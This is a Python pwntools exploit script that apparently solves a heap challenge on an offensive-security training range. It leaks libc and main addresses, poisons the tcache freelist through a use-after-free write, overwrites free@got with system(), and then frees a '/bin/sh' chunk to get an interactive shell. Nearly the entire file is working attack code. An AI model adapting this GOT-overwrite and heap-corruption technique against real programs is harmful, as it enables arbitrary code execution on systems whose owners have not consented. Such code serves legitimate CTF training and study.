from pwn import *

COMMANDS = """
    b *main+0x378
    c
"""

def malloc(p, size: int):
    p.sendline("malloc " + str(size))
    p.recvuntil(b"==> ")
    address = p.read(14)
    address = address[2::]
    p.recvuntil(b"> ")
    return address

def free(p, pointer):
    p.send(b"free 0x" + pointer + b"\n")
    p.recvuntil(b"> ")

def show(p, pointer, n: int):
    payload = b"show 0x" + pointer
    if(n != 0):
        payload += b" " + bytes(n)
    p.send(payload + b"\n")
    p.recvuntil(b": ")
    address = p.read(16)
    address = address.ljust(8, b"\x00")
    address = address[4::]
    p.recvuntil(b"> ")
    return address

def write(p, pointer, n, string: bytes):
    payload = b"write 0x" + pointer
    if(n != 0):
        payload += b" " + n
    p.send(payload + b"\n")
    p.recvuntil(b"==> read\n")
    p.send(string + b"\0")
    p.recvuntil(b"> ")

def final_free(p, pointer):
    p.send(b"free 0x" + pointer + b"\n")


if args.GDB:
    p = gdb.debug('./playground', COMMANDS)
    
elif args.REMOTE:
    p = remote('playground.training.offensivedefensive.it', 8080, ssl=True)
    
else:
    p = process('./playground')
    
    
OFFSET_GOT_FREE_MAIN = 11839  #the difference between the got address of free and the main
OFFSET_LIBC_BASE = 4111520 #the difference between the leak of libc and the base address of libc
OFFSET_SYSTEM_LIBC_BASE = 324944 #the difference between the system() function and the base address of libc
OFFSET_MAIN_MAX_HEAP = 11975 #the difference between the bss area with min_heap and the main address

p.recvuntil(b"main: ")
main_addr = p.read(14)
print(f'Main at: {main_addr.decode()}')


addr0 = malloc(p, 0x600)
addr1 = malloc(p, 50)
free(p, addr0)
libc_leak = show(p, addr0, 0)
print(f'libc_leak 0x{libc_leak.decode()}')

addr2 = malloc(p, 50)
n_main_addr = int(main_addr, 16)
target = n_main_addr + OFFSET_MAIN_MAX_HEAP # THIS IS OK: min_heap address
print(f'min_heap at :{hex(target)}')
target = p64(target)
free(p, addr1)
free(p, addr2)
write(p, addr2, b"9", target) # HERE WE HAVE A PROBLEM

addr3 = malloc(p, 50)
addr4 = malloc(p, 50)
n_target_got = int(main_addr, 16) + OFFSET_GOT_FREE_MAIN # THIS IS OK: free@got address
n_target_got = hex(n_target_got)[2::]
n_addr_to_write = int(libc_leak, 16) - OFFSET_LIBC_BASE + OFFSET_SYSTEM_LIBC_BASE # THIS IS OK: system address

print(f'free@got: 0x{n_target_got}')
print(f'system at: {hex(n_addr_to_write)}')

write(p, bytes(n_target_got, 'utf-8'), b"9", p64(n_addr_to_write))

addr5 = malloc(p, 0x60)
write(p, addr5, b"9", b"/bin/sh")
n_bin_sh = int(addr5, 16)
n_bin_sh = hex(n_bin_sh)[2::]
final_free(p, addr5)

p.interactive()